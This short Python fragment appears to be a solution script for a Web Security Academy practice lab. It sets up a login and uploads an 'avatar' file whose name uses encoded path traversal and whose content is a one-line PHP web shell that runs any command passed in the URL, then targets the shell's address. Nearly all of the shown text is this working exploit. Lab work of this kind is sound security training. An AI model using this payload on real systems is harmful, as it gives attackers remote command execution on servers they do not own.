...
URL = "https://0ad20053048fb48a818e618300b20061.web-security-academy.net"
login = URL + "/login"
...
file_payload = {
    'avatar': ('%2e%2e%2fwshell.php', "<?php system($_GET['command']); ?>", 'application/x-php'),
    'user':(None,'wiener'),
...
wshell_url = URL + "/files/wshell.php"
